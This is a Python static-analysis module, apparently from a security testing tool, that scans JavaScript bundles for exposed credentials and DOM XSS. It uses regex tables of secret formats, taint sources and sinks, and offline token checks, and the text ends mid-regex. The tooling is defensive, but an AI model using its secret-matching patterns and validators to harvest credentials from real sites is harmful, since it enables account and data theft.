#!/usr/bin/env python3
"""Static analysis of JavaScript, written for evidence you can put in a report.

Why this exists in its own module
─────────────────────────────────
The first version scanned line by line, truncated every line at 5,000
characters and kept only the first match of each rule per line. Against a
production bundle — one line, two megabytes — that is close to useless: every
finding says "line 1", everything past the first 5 KB is never examined at
all, and a parameter that appears 130 times is reported once with no way to
tell which occurrence mattered.

So this module does not think in lines. It scans the whole file by byte
offset, and every finding carries:

  * line and column, plus the absolute character offset
  * a bounded excerpt of the surrounding code with the match marked
  * the enclosing webpack/rollup module path where the bundle exposes one
  * the original file, line and column when a source map can be fetched
  * how many times the same thing occurs, and where the other occurrences are

Identical findings are collapsed into one entry with an occurrence count and
a handful of exemplar locations, rather than emitted N times.

What it looks for, and what it deliberately does not
────────────────────────────────────────────────────
Secrets are split into two classes that a report must never conflate:
credentials that can never legitimately appear in a browser bundle (AWS keys,
Stripe secret keys, private keys) and values that are *supposed* to be public
(Stripe publishable keys, Firebase apiKey, Sentry DSNs, Mapbox pk. tokens).
The second class is reported as configuration with the misconfiguration to go
and check, never as "exposed secret" — getting that wrong is what makes a
report look automated.

DOM XSS is reported by taint proximity, not by sink inventory. A sink with a
reachable source near it is a finding; a sink on its own is listed separately
and labelled as needing manual triage, because `el.innerHTML = t` where `t` is
a template string is not a vulnerability and reporting it as one wastes the
client's time and yours.

Nothing here executes the JavaScript it reads, and no network request is made
from this module — the caller supplies content and, optionally, a fetcher for
source maps.

References for the rule shapes: Gitleaks' default rule set, Nosey Parker's
builtin rules, Yelp detect-secrets' entropy plugins, and PortSwigger's
sources-and-sinks tables for the DOM XSS and prototype pollution work.
"""

from __future__ import annotations

import base64
import binascii
import json
import math
import re
import zlib
from dataclasses import dataclass, field

# ─────────────────────────────────────────────────────────────────────────────
#  Severities
# ─────────────────────────────────────────────────────────────────────────────

SEV_ORDER = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}

#: How much of the surrounding source to keep either side of a match. A line
#: of context is meaningless in a minified bundle; a character window is not.
CONTEXT_BEFORE = 110
CONTEXT_AFTER = 110

#: Locations kept per deduplicated finding. The count is always exact; this
#: only bounds how many examples are carried as evidence.
MAX_LOCATIONS = 5

#: A file whose average line is longer than this is treated as minified, which
#: changes how results are presented and which rules are worth running.
MINIFIED_AVG_LINE = 400


# ─────────────────────────────────────────────────────────────────────────────
#  Position and context
# ─────────────────────────────────────────────────────────────────────────────

class LineIndex:
    """Turns a character offset into a line and column, in O(log n).

    Built once per file. Doing this with ``content.count("\\n", 0, offset)``
    per match is quadratic, which matters when a bundle produces thousands of
    candidate matches.
    """

    def __init__(self, content: str):
        self._starts = [0]
        start = content.find("\n")
        while start != -1:
            self._starts.append(start + 1)
            start = content.find("\n", start + 1)

    def position(self, offset: int) -> tuple:
        """(line, column), both 1-indexed."""
        lo, hi = 0, len(self._starts) - 1
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._starts[mid] <= offset:
                lo = mid
            else:
                hi = mid - 1
        return lo + 1, offset - self._starts[lo] + 1


def excerpt(content: str, start: int, end: int,
            before: int = CONTEXT_BEFORE, after: int = CONTEXT_AFTER) -> str:
    """A one-line window of source around a match, with the match marked.

    Newlines and tabs are flattened so the excerpt stays a single readable
    line in a console and in a text report. The markers are ``»…«`` so the
    exact span is unambiguous even when the surrounding code is dense.
    """
    left = max(0, start - before)
    right = min(len(content), end + after)
    head = content[left:start]
    body = content[start:end]
    tail = content[end:right]

    def flat(text):
        return re.sub(r"\s+", " ", text.replace("\t", " ")).strip()

    out = f"{'…' if left > 0 else ''}{flat(head)} »{flat(body)}« {flat(tail)}{'…' if right < len(content) else ''}"
    return re.sub(r"\s{2,}", " ", out).strip()


#: Webpack 5 and Vite keep the original module path in the bundle as an object
#: key; webpack 4 leaves a `/***/ "./src/thing.js"` banner. Either is the most
#: useful anchor a developer can be given, because it survives minification
#: and names real code.
_MODULE_KEY_RE = re.compile(r"""["'](\.{1,2}/[^"'\n]{3,120}?\.[a-z]{1,4})["']\s*:\s*(?:function|\(|\[)""")
_MODULE_BANNER_RE = re.compile(r"""/\*+/\s*["'](\.{1,2}/[^"'\n]{3,120})["']""")


def _module_anchors(content: str) -> list:
    """Sorted (offset, module_path) pairs for every module boundary found."""
    anchors = []
    for rx in (_MODULE_KEY_RE, _MODULE_BANNER_RE):
        for m in rx.finditer(content):
            anchors.append((m.start(), m.group(1)))
    anchors.sort()
    return anchors


def _module_for(anchors: list, offset: int):
    """The module whose declaration most recently precedes ``offset``."""
    if not anchors:
        return ""
    lo, hi = 0, len(anchors) - 1
    if offset < anchors[0][0]:
        return ""
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if anchors[mid][0] <= offset:
            lo = mid
        else:
            hi = mid - 1
    return anchors[lo][1]


# ─────────────────────────────────────────────────────────────────────────────
#  Source maps
# ─────────────────────────────────────────────────────────────────────────────

_B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
_B64_INDEX = {ch: i for i, ch in enumerate(_B64)}


def _decode_vlq(segment: str) -> list:
    """Decode one base64 VLQ segment into its signed integer fields."""
    values, shift, acc = [], 0, 0
    for ch in segment:
        digit = _B64_INDEX.get(ch)
        if digit is None:
            return values
        acc += (digit & 31) << shift
        if digit & 32:
            shift += 5
            continue
        value = acc >> 1
        values.append(-value if acc & 1 else value)
        shift, acc = 0, 0
    return values


class SourceMap:
    """Just enough of the Source Map v3 format to answer "where was this?".

    Only ``originalPositionFor`` is implemented, because that is the one thing
    that turns "offset 418,902 of main.a3f91c.js" into "src/admin/Billing.tsx
    line 142" — which is the difference between a finding a developer can act
    on and one they will argue with.
    """

    def __init__(self, raw: str):
        data = json.loads(raw)
        self.sources = data.get("sources") or []
        self.sources_content = data.get("sourcesContent") or []
        self.names = data.get("names") or []
        self.source_root = data.get("sourceRoot") or ""
        self._lines = {}
        self._parse(data.get("mappings") or "")

    def _parse(self, mappings: str):
        src_idx = src_line = src_col = name_idx = 0
        for line_no, group in enumerate(mappings.split(";")):
            if not group:
                continue
            gen_col = 0
            entries = []
            for segment in group.split(","):
                if not segment:
                    continue
                fields = _decode_vlq(segment)
                if not fields:
                    continue
                gen_col += fields[0]
                if len(fields) >= 4:
                    src_idx += fields[1]
                    src_line += fields[2]
                    src_col += fields[3]
                    name = ""
                    if len(fields) >= 5:
                        name_idx += fields[4]
                        if 0 <= name_idx < len(self.names):
                            name = self.names[name_idx]
                    entries.append((gen_col, src_idx, src_line, src_col, name))
            if entries:
                self._lines[line_no] = entries

    def original_position(self, line: int, column: int):
        """Map a 1-indexed generated position back to the original source.

        Source maps are sparse — they record the start of each token, not every
        character — so an exact hit is rare. The nearest preceding mapping on
        the same line is used, and the result says which of the two it was so
        a reader knows how much to trust the column.
        """
        entries = self._lines.get(line - 1)
        if not entries:
            return None

        target = column - 1
        best = None
        for entry in entries:
            if entry[0] <= target:
                best = entry
            else:
                break
        if best is None:
            best = entries[0]

        gen_col, src_idx, src_line, src_col, name = best
        source = ""
        if 0 <= src_idx < len(self.sources):
            source = self.sources[src_idx]
            if self.source_root and not source.startswith(("/", "http", "webpack")):
                source = self.source_root.rstrip("/") + "/" + source.lstrip("/")
        return {
            "source": source,
            "line": src_line + 1,
            "column": src_col + 1,
            "name": name,
            "exact": gen_col == target,
            "vendored": "node_modules" in source,
        }

    def content_for(self, source: str) -> str:
        try:
            index = self.sources.index(source)
        except ValueError:
            return ""
        if 0 <= index < len(self.sources_content):
            return self.sources_content[index] or ""
        return ""


# ─────────────────────────────────────────────────────────────────────────────
#  Entropy and noise
# ─────────────────────────────────────────────────────────────────────────────

def shannon_entropy(value: str) -> float:
    """Bits of entropy per character."""
    if not value:
        return 0.0
    counts = {}
    for ch in value:
        counts[ch] = counts.get(ch, 0) + 1
    length = len(value)
    return -sum((c / length) * math.log2(c / length) for c in counts.values())


#: Substrings that disqualify a "generic secret" capture. Minified bundles
#: concatenate English words into things that look exactly like base62 keys;
#: this is the list that makes a generic rule survivable. Taken from the
#: stopword approach in Gitleaks' generic-api-key rule.
_GENERIC_STOPWORDS = (
    "abstract", "adapter", "analytics", "android", "angular", "animation",
    "application", "argument", "assertion", "attribute", "authentication",
    "background", "bootstrap", "boundary", "browser", "builder", "callback",
    "canvas", "checkbox", "children", "classname", "client", "collection",
    "compiler", "component", "config", "constructor", "container", "content",
    "context", "controller", "converter", "customer", "database", "default",
    "delegate", "dependency", "descriptor", "development", "directive",
    "document", "element", "encoding", "environment", "error", "example",
    "exception", "expression", "extension", "factory", "fallback", "feature",
    "function", "generator", "gradient", "handler", "helper", "identifier",
    "immutable", "implementation", "important", "information", "inherit",
    "initial", "instance", "interface", "internal", "iterator", "javascript",
    "keyboard", "language", "listener", "loading", "localhost", "location",
    "manager", "material", "message", "metadata", "middleware", "migration",
    "modifier", "module", "namespace", "navigation", "notification", "number",
    "observer", "operation", "optional", "override", "package", "parameter",
    "parser", "password", "pattern", "placeholder", "plugin", "polyfill",
    "position", "prefix", "presentation", "primary", "process", "production",
    "promise", "property", "prototype", "provider", "reducer", "reference",
    "register", "renderer", "request", "resolver", "resource", "response",
    "runtime", "sample", "scheduler", "selector", "sequence", "serializer",
    "service", "session", "settings", "shadow", "signature", "source",
    "standard", "statement", "storage", "strategy", "string", "structure",
    "subscription", "template", "textarea", "thumbnail", "timeout", "toggle",
    "tooltip", "transform", "transition", "translate", "transport", "undefined",
    "validator", "variable", "version", "viewport", "warning", "webpack",
    "wrapper", "xmlhttprequest", "your_", "example", "changeme", "placeholder",
    "lorem", "ipsum", "abcdef", "123456", "test", "dummy", "sample",
)

#: Names that look like a key but are not one. `publicKey`, `keyCode` and
#: `csrfToken` appear in practically every bundle ever built.
_NOT_A_SECRET_NAME = re.compile(
    r"(?i)\b("
    r"public[_.-]?(?:key|token)|"
    r"(?:bucket|foreign|hot|idx|natural|primary|pub|schema|sequence)[_.-]?key|"
    r"key[_.-]?(?:alias|board|code|down|frame|id|length|left|name|pair|press|right|ring|size|up|word)|"
    r"csrf[_.-]?token|xsrf[_.-]?token|anti[_.-]?forgery|"
    r"api[_.-]?(?:endpoint|url|uri|version|path)|"
    r"token[_.-]?(?:type|name|index|list|stream)|"
    r"accessor|accessibility|keying|turkey|monkey"
    r")\b"
)

_UUID_RE = re.compile(
    r"(?i)^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$"
)
_HASH_LENGTHS = {32, 40, 64, 128}

#: Regions of a file that generate enormous high-entropy strings which are
#: never secrets: inline images and fonts, source-map VLQ payloads, and
#: subresource-integrity digests.
_NOISE_REGION_RES = (
    re.compile(r"data:[a-zA-Z0-9.+-]+/[a-zA-Z0-9.+-]+;base64,[A-Za-z0-9+/=]{40,}"),
    re.compile(r'"mappings"\s*:\s*"[^"]*"'),
    re.compile(r'"sourcesContent"\s*:\s*\[', ),
    re.compile(r"(?i)integrity\s*=?\s*['\"]?sha(?:256|384|512)-[A-Za-z0-9+/=]{20,}"),
    re.compile(r"(?i)sourceMappingURL=data:application/json[^\s'\"]+"),
)


def noise_regions(content: str) -> list:
    """Byte ranges that must be excluded before any entropy-based rule runs."""
    spans = []
    for rx in _NOISE_REGION_RES:
        for m in rx.finditer(content):
            spans.append((m.start(), m.end()))
    spans.sort()
    merged = []
    for start, end in spans:
        if merged and start <= merged[-1][1]:
            merged[-1][1] = max(merged[-1][1], end)
        else:
            merged.append([start, end])
    return [(a, b) for a, b in merged]


def in_spans(spans: list, offset: int) -> bool:
    if not spans:
        return False
    lo, hi = 0, len(spans) - 1
    while lo <= hi:
        mid = (lo + hi) // 2
        start, end = spans[mid]
        if offset < start:
            hi = mid - 1
        elif offset >= end:
            lo = mid + 1
        else:
            return True
    return False


def looks_like_noise(value: str) -> bool:
    """True when a captured string is structurally something other than a key."""
    if not value:
        return True
    lowered = value.lower()
    if _UUID_RE.match(value):
        return True
    if any(word in lowered for word in _GENERIC_STOPWORDS):
        return True
    # A bare hash with no other context is a hash, not a credential.
    if len(value) in _HASH_LENGTHS and re.fullmatch(r"[0-9a-fA-F]+", value):
        return True
    # All-digit or near-all-digit strings score high on a hex alphabet but
    # carry no real randomness — detect-secrets applies the same correction.
    digits = sum(ch.isdigit() for ch in value)
    if digits == len(value):
        return True
    # A run with no digits at all is almost always an identifier.
    if digits == 0 and value.isalpha():
        return True
    if re.fullmatch(r"(?:[A-Za-z]+[-_]){2,}[A-Za-z]+", value):
        return True
    return False


# ─────────────────────────────────────────────────────────────────────────────
#  Offline credential validators
# ─────────────────────────────────────────────────────────────────────────────

_BASE62 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"


def github_token_checksum_ok(token: str):
    """Verify the CRC32 checksum GitHub embeds in its token formats.

    GitHub's tokens are ``<prefix>_<30 random base62><6 base62 CRC32>``. The
    checksum can be verified with no network call at all, which turns a
    pattern match into a near-certain identification. Returns True, False, or
    None when the token is not of a shape that carries a checksum.
    """
    body = token.split("_", 1)[-1]
    if len(body) < 36:
        return None
    payload, checksum = body[:30], body[30:36]
    crc = zlib.crc32(payload.encode())
    encoded = ""
    while crc:
        crc, rem = divmod(crc, 62)
        encoded = _BASE62[rem] + encoded
    return encoded.rjust(6, "0") == checksum


def aws_account_from_key(key_id: str):
    """Recover the AWS account number encoded inside an access key ID.

    The 16 characters after AKIA/ASIA are base32; the account number is in
    there. Worth doing because it identifies the owner of the key in the
    report without touching AWS at all.
    """
    try:
        trimmed = key_id[4:20].upper()
        if len(trimmed) != 16:
            return None
        # 16 base32 characters is already a whole number of decoded bytes;
        # padding it would make the length invalid rather than fixing it.
        raw = base64.b32decode(trimmed)
        value = int.from_bytes(raw[:6], "big")
        mask = int.from_bytes(binascii.unhexlify("7fffffffff80"), "big")
        return str((value & mask) >> 7).zfill(12)
    except Exception:
        return None


def decode_jwt(token: str):
    """Decode a JWT's header and payload without verifying the signature."""
    parts = token.split(".")
    if len(parts) < 2:
        return None

    def seg(part):
        try:
            padded = part + "=" * (-len(part) % 4)
            return json.loads(base64.urlsafe_b64decode(padded.encode()).decode("utf-8", "replace"))
        except Exception:
            return None

    header, payload = seg(parts[0]), seg(parts[1])
    if not isinstance(payload, dict):
        return None
    return {"header": header if isinstance(header, dict) else {},
            "payload": payload}


# ─────────────────────────────────────────────────────────────────────────────
#  Finding records
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class Location:
    """Where a finding is, in enough detail to be acted on."""
    file: str = ""
    line: int = 0
    column: int = 0
    offset: int = 0
    excerpt: str = ""
    module: str = ""
    original: dict = None

    def describe(self) -> str:
        """One line naming the position, preferring the original source."""
        where = f"line {self.line}, col {self.column} (offset {self.offset})"
        if self.original and self.original.get("source"):
            orig = self.original
            precision = "" if orig.get("exact") else " approx."
            where = (f"{orig['source']}:{orig['line']}:{orig['column']}{precision}"
                     f"  [minified {where}]")
        elif self.module:
            where = f"module {self.module} — {where}"
        return where


@dataclass
class Finding:
    severity: str
    category: str
    title: str
    evidence: str = ""
    rec: str = ""
    detail: str = ""
    confidence: str = "firm"          # confirmed | firm | tentative
    cwe: str = ""
    count: int = 0
    locations: list = field(default_factory=list)

    @property
    def key(self):
        return (self.category, self.title, self.evidence)


def _redact(value: str, keep: int = 6) -> str:
    """Show enough of a credential to identify it, not enough to use it.

    A report circulates: by email, in a PDF, through a ticketing system. The
    full key belongs in the tester's own notes, not in every copy of the
    output, so what is written out is the prefix plus a length.
    """
    value = value.strip()
    if len(value) <= keep + 4:
        return value
    return f"{value[:keep]}…{value[-2:]} ({len(value)} chars)"


# ─────────────────────────────────────────────────────────────────────────────
#  Secret rules
# ─────────────────────────────────────────────────────────────────────────────
# (name, regex, severity, class, note)
#   class "forbidden"  — can never legitimately be in a browser bundle
#   class "public"     — designed to ship to the browser; the finding, if any,
#                        is the misconfiguration behind it
#
# Shapes follow the Gitleaks / Nosey Parker rule sets. The trailing boundary
# matters in minified code: without it a fixed-length character class happily
# slices a window out of a longer identifier run.

FORBIDDEN_SECRETS = [
    ("AWS access key ID", re.compile(r"\b((?:A3T[A-Z0-9]|AKIA|ASIA|ABIA|ACCA)[A-Z2-7]{16})\b"), "CRITICAL"),
    ("AWS session token", re.compile(r"\b(FwoGZXIvYXdzE[A-Za-z0-9+/=]{50,})"), "CRITICAL"),
    ("GitHub personal access token", re.compile(r"\b(ghp_[0-9A-Za-z]{36})\b"), "CRITICAL"),
    ("GitHub OAuth token", re.compile(r"\b(gho_[0-9A-Za-z]{36})\b"), "CRITICAL"),
    ("GitHub server-to-server token", re.compile(r"\b((?:ghu|ghs)_[0-9A-Za-z]{36})\b"), "CRITICAL"),
    ("GitHub refresh token", re.compile(r"\b(ghr_[0-9A-Za-z]{36})\b"), "CRITICAL"),
    ("GitHub fine-grained PAT", re.compile(r"\b(github_pat_\w{82})\b"), "CRITICAL"),
    ("GitLab personal access token", re.compile(r"\b(glpat-[0-9A-Za-z_-]{20,})\b"), "CRITICAL"),
    ("Stripe secret key", re.compile(r"\b((?:sk|rk)_(?:live|prod)_[0-9A-Za-z]{10,99})\b"), "CRITICAL"),
    ("Stripe test secret key", re.compile(r"\b((?:sk|rk)_test_[0-9A-Za-z]{10,99})\b"), "HIGH"),
    ("Stripe webhook signing secret", re.compile(r"\b(whsec_[0-9A-Za-z]{32,})\b"), "HIGH"),
    ("Google OAuth client secret", re.compile(r"\b(GOCSPX-[0-9A-Za-z_-]{28})\b"), "CRITICAL"),
    ("Google OAuth access token", re.compile(r"\b(ya29\.[0-9A-Za-z_-]{20,512})"), "CRITICAL"),
    ("Slack bot token", re.compile(r"\b(xoxb-[0-9]{8,14}-[0-9A-Za-z-]{10,})"), "CRITICAL"),
    ("Slack user token", re.compile(r"\b(xox[pe]-(?:[0-9]{10,13}-){2,3}[0-9A-Za-z-]{20,})"), "CRITICAL"),
    ("Slack app-level token", re.compile(r"\b(xapp-\d-[A-Z0-9]+-\d+-[0-9a-f]{40,})"), "CRITICAL"),
    ("Slack incoming webhook", re.compile(r"(https://hooks\.slack\.com/(?:services|workflows|triggers)/[A-Za-z0-9+/_-]{40,})"), "HIGH"),
    ("SendGrid API key", re.compile(r"\b(SG\.[0-9A-Za-z_-]{20,24}\.[0-9A-Za-z_-]{39,64})\b"), "CRITICAL"),
    ("Mailgun private API key", re.compile(r"\b(key-[0-9a-f]{32})\b"), "CRITICAL"),
    ("OpenAI API key", re.compile(r"\b(sk-(?:proj-|svcacct-|admin-)?[A-Za-z0-9_-]{20,}T3BlbkFJ[A-Za-z0-9_-]{20,})\b"), "CRITICAL"),
    ("Anthropic API key", re.compile(r"\b(sk-ant-(?:api|admin)\d{2}-[A-Za-z0-9_-]{80,120})\b"), "CRITICAL"),
    ("npm access token", re.compile(r"\b(npm_[0-9A-Za-z]{36})\b"), "CRITICAL"),
    ("Twilio API key SID", re.compile(r"\b(SK[0-9a-fA-F]{32})\b"), "HIGH"),
    ("Shopify access token", re.compile(r"\b(shp(?:at|ca|pa|ss)_[0-9a-fA-F]{32})\b"), "CRITICAL"),
    ("Square access token", re.compile(r"\b((?:EAAA|sq0atp-)[0-9A-Za-z_-]{22,60})\b"), "CRITICAL"),
    ("Postman API key", re.compile(r"\b(PMAK-[0-9a-f]{24}-[0-9a-f]{34})\b"), "CRITICAL"),
    ("Databricks token", re.compile(r"\b(dapi[0-9a-f]{32}(?:-\d)?)\b"), "CRITICAL"),
    ("HuggingFace token", re.compile(r"\b((?:hf_|api_org_)[0-9A-Za-z]{34})\b"), "CRITICAL"),
    ("Supabase personal token", re.compile(r"\b(sbp_(?:v0_)?[0-9a-f]{40})\b"), "CRITICAL"),
    ("Supabase secret API key", re.compile(r"\b(sb_secret_[0-9A-Za-z_-]{20,})\b"), "CRITICAL"),
    ("Doppler token", re.compile(r"\b(dp\.(?:pt|ct|st|sa|scim|audit)\.[0-9A-Za-z]{40,48})\b"), "CRITICAL"),
    ("Linear API key", re.compile(r"\b(lin_api_[0-9A-Za-z]{40})\b"), "CRITICAL"),
    ("Notion integration token", re.compile(r"\b(ntn_[0-9A-Za-z]{40,50}|secret_[0-9A-Za-z]{43})\b"), "CRITICAL"),
    ("Figma access token", re.compile(r"\b(figd_[0-9A-Za-z_-]{40})\b"), "CRITICAL"),
    ("Discord bot token", re.compile(r"\b((?:M|N|O)[A-Za-z0-9_-]{23,26}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,38})\b"), "CRITICAL"),
    ("Mapbox secret token", re.compile(r"\b(sk\.[0-9A-Za-z._-]{60,240})\b"), "CRITICAL"),
    ("Sentry auth token", re.compile(r"\b(sntry[us]_[0-9A-Za-z._-]{32,})"), "CRITICAL"),
    ("HashiCorp Vault token", re.compile(r"\b(hv[sb]\.[0-9A-Za-z_-]{24,120})\b"), "CRITICAL"),
    ("Azure AD client secret", re.compile(r"(?:[\s'\"=:(,])([0-9A-Za-z_~.]{3}\dQ~[0-9A-Za-z_~.-]{31,34})(?:[\s'\"<),]|$)"), "CRITICAL"),
    ("Azure storage account key", re.compile(r"(?i)AccountKey\s*=\s*([A-Za-z0-9+/]{60,100}={0,3})"), "CRITICAL"),
    ("Dropbox token", re.compile(r"\b(sl\.[A-Za-z0-9_-]{130,})\b"), "CRITICAL"),
    ("Private key block", re.compile(r"(-----BEGIN[ A-Z0-9_-]{0,40}PRIVATE KEY(?: BLOCK)?-----)"), "CRITICAL"),
    ("Mailchimp API key", re.compile(r"\b([0-9a-f]{32}-us\d{1,2})\b"), "CRITICAL"),
]

PUBLIC_BY_DESIGN = [
    ("Stripe publishable key", re.compile(r"\b(pk_(?:live|test)_[0-9A-Za-z]{10,99})\b"),
     "Publishable keys are meant to be in the page — they can only create tokens. "
     "This is a finding only if a matching sk_/rk_ secret key or a whsec_ webhook "
     "secret also appears in the bundle."),
    ("Google API key", re.compile(r"\b(AIza[0-9A-Za-z_-]{35})\b"),
     "Browser keys must ship to the client; the control is HTTP-referrer and API "
     "restriction. Test for an unrestricted key by calling a billable API with no "
     "Referer header — see the guidance for this category."),
    ("Google OAuth client ID", re.compile(r"\b([0-9]+-[0-9a-z_]{20,32}\.apps\.googleusercontent\.com)\b"),
     "Public half of the OAuth pair. Only a finding alongside a GOCSPX- secret or a "
     "permissive redirect_uri allowlist."),
    ("Mapbox public token", re.compile(r"\b(pk\.[0-9A-Za-z._-]{60,240})\b"),
     "Public access token, intended for browsers. Check its scopes — a pk. carrying "
     "styles:write / tilesets:write / datasets:write is a real finding."),
    ("Sentry DSN", re.compile(r"(https://[0-9a-f]{32}@[0-9a-zA-Z.\-]+/\d+|https://[0-9a-f]{32}@o\d+\.ingest\.[0-9a-zA-Z.\-]+/\d+)"),
     "A DSN is write-only event ingestion and is public by design. Escalate only if "
     "the Sentry instance is self-hosted and reachable, or an sntryu_/sntrys_ auth "
     "token is also present."),
    ("reCAPTCHA site key", re.compile(r"\b(6L[0-9A-Za-z_-]{38})\b"),
     "Site keys are public. Confirm the matching secret key is not also in the bundle."),
    ("Algolia application ID", re.compile(r"(?i)(?:algolia[^,;\n]{0,40})['\"]([A-Z0-9]{10})['\"]"),
     "The App ID is public. What matters is the key beside it — introspect its ACL "
     "before deciding severity."),
]

#: Assignment-shaped generic rule. Anchored on a credential-ish identifier
#: within a short distance of a quoted value, which is what keeps it usable in
#: minified code. Everything it captures still passes through the stopword,
#: name-allowlist and entropy filters before it is reported.
GENERIC_SECRET_RE = re.compile(
    r"""(?i)["'`]?\b(
            api[_-]?key|apikey|access[_-]?key|secret[_-]?key|client[_-]?secret|
            auth[_-]?token|access[_-]?token|refresh[_-]?token|bearer[_-]?token|
            private[_-]?key|encryption[_-]?key|signing[_-]?key|
            password|passwd|pwd|credential|session[_-]?secret|app[_-]?secret
        )\b["'`]?\s*[:=]\s*["'`]([A-Za-z0-9_\-+/=.~]{16,120})["'`]"""
)

GENERIC_ENTROPY_BASE64 = 4.2
GENERIC_ENTROPY_HEX = 3.0


# ─────────────────────────────────────────────────────────────────────────────
#  DOM XSS — sources, sinks and proximity
# ─────────────────────────────────────────────────────────────────────────────
# Sources and sinks follow PortSwigger's tables. They are kept separate because
# the finding is the *pair*: a sink alone is an inventory item, a sink fed by a
# source is a vulnerability worth writing up.

TAINT_SOURCES = [
    ("location.hash", re.compile(r"\blocation\s*\.\s*hash\b"), "HIGH"),
    ("location.search", re.compile(r"\blocation\s*\.\s*search\b"), "HIGH"),
    ("location.href", re.compile(r"\blocation\s*\.\s*href\b"), "MEDIUM"),
    ("location.pathname", re.compile(r"\blocation\s*\.\s*pathname\b"), "MEDIUM"),
    ("document.URL", re.compile(r"\bdocument\s*\.\s*(?:URL|documentURI|baseURI)\b"), "MEDIUM"),
    ("URLSearchParams", re.compile(r"\bnew\s+URLSearchParams\b|\bsearchParams\s*\.\s*get\s*\("), "HIGH"),
    ("document.referrer", re.compile(r"\bdocument\s*\.\s*referrer\b"), "MEDIUM"),
    ("window.name", re.compile(r"\bwindow\s*\.\s*name\b"), "MEDIUM"),
    ("document.cookie", re.compile(r"\bdocument\s*\.\s*cookie\b"), "MEDIUM"),
    ("localStorage", re.compile(r"\b(?:local|session)Storage\s*\.\s*getItem\s*\("), "MEDIUM"),
    ("postMessage data", re.compile(r"\b(?:event|e|msg|message|ev)\s*\.\s*data\b"), "HIGH"),
    ("history.state", re.compile(r"\bhistory\s*\.\s*state\b"), "LOW"),
]

#: Sinks that execute script directly — no HTML parsing needed.
EXEC_SINKS = [
    ("eval()", re.compile(r"(?<![.\w$])eval\s*\(")),
    ("new Function()", re.compile(r"\bnew\s+Function\s*\(")),
    ("Function()", re.compile(r"(?<![.\w$])Function\s*\(\s*['\"`]")),
    ("script.src assignment", re.compile(r"\.\s*src\s*=\s*(?![\"'`])[A-Za-z_$]")),
    ("setAttribute event handler", re.compile(r"""\.setAttribute\s*\(\s*['"`]on[a-z]+['"`]""")),
    ("Worker()", re.compile(r"\bnew\s+(?:Worker|SharedWorker)\s*\(")),
    ("importScripts()", re.compile(r"\bimportScripts\s*\(")),
]

#: Sinks that parse HTML. Script runs through an event handler attribute
#: (`<img onerror>`), never through a bare `<script>` tag.
HTML_SINKS = [
    ("innerHTML", re.compile(r"\.\s*innerHTML\s*=")),
    ("outerHTML", re.compile(r"\.\s*outerHTML\s*=")),
    ("insertAdjacentHTML", re.compile(r"\.insertAdjacentHTML\s*\(")),
    ("document.write", re.compile(r"\bdocument\s*\.\s*write(?:ln)?\s*\(")),
    ("setHTMLUnsafe", re.compile(r"\.setHTMLUnsafe\s*\(")),
    ("createContextualFragment", re.compile(r"\.createContextualFragment\s*\(")),
    ("iframe srcdoc", re.compile(r"\.\s*srcdoc\s*=")),
    ("jQuery .html()", re.compile(r"\.html\s*\(\s*(?![)\"'`])")),
    ("jQuery .append()", re.compile(r"\.(?:append|prepend|after|before|replaceWith|wrap)\s*\(\s*(?![)\"'`])")),
    ("jQuery $() selector", re.compile(r"(?<![\w$.])\$\s*\(\s*(?![)\"'`.#\[])[A-Za-z_$]")),
    ("React dangerouslySetInnerHTML", re.compile(r"dangerouslySetInnerHTML")),
    ("Vue v-html", re.compile(r"\bv-html\b")),
    ("AngularJS ng-bind-html", re.compile(r"\bng-bind-html\b")),
    ("Angular bypassSecurityTrust", re.compile(r"\bbypassSecurityTrust(?:Html|Script|Url|ResourceUrl|Style)\s*\(")),
    ("Svelte {@html}", re.compile(r"\{@html\b")),
    ("lit unsafeHTML", re.compile(r"\bunsafe(?:HTML|SVG)\s*\(")),
]

#: Sinks that navigate. Taint at the *scheme* position is XSS via
#: `javascript:`; taint later in the URL is an open redirect.
NAV_SINKS = [
    ("location assignment", re.compile(r"\b(?:window\s*\.\s*)?location(?:\s*\.\s*href)?\s*=\s*(?![\"'`])[A-Za-z_$]")),
    ("location.assign/replace", re.compile(r"\blocation\s*\.\s*(?:assign|replace)\s*\(")),
    ("window.open", re.compile(r"\bwindow\s*\.\s*open\s*\(")),
    ("anchor href assignment", re.compile(r"\.\s*href\s*=\s*(?![\"'`])[A-Za-z_$]")),
    ("form action assignment", re.compile(r"\.\s*(?:action|formAction)\s*=\s*(?![\"'`])[A-Za-z_$]")),
]

#: setTimeout / setInterval are only sinks when the first argument is a string.
#: Flagging every call is the single biggest false-positive source in naive
#: scanners, so the argument is inspected rather than assumed.
_TIMER_RE = re.compile(r"\bset(?:Timeout|Interval)\s*\(\s*([^,\n]{0,60})")

#: How far from a sink a source has to be before the two stop being plausibly
#: related. Minified code packs a lot into a small span, so this is tight.
TAINT_WINDOW = 220


def _nearest_source(content: str, offset: int, window: int = TAINT_WINDOW):
    """The highest-severity taint source within ``window`` chars of an offset."""
    left = max(0, offset - window)
    right = min(len(content), offset + window)
    chunk = content[left:right]
    best = None
    for name, rx, weight in TAINT_SOURCES:
        if rx.search(chunk):
            rank = SEV_ORDER.get(weight, 0)
            if best is None or rank > best[1]:
                best = (name, rank)
    return best[0] if best else ""


# ─────────────────────────────────────────────────────────────────────────────
#  postMessage
# ─────────────────────────────────────────────────────────────────────────────

_LISTENER_RE = re.compile(
    r"""(?:addEventListener\s*\(\s*['"`]message['"`]|
         \bon\s*message\s*=\s*(?:function|\(|[A-Za-z_$])|
         attachEvent\s*\(\s*['"`]onmessage['"`])""", re.VERBOSE)

#: A strict check compares the origin to a constant with === or an allowlist
#: membership test on the whole value.
_STRICT_ORIGIN_RE = re.compile(
    r"""(?:\.origin\s*(?:===|!==|==|!=)\s*['"`][^'"`]+['"`]|
         ['"`][^'"`]+['"`]\s*(?:===|!==)\s*[A-Za-z_$][\w$]*\s*\.\s*origin|
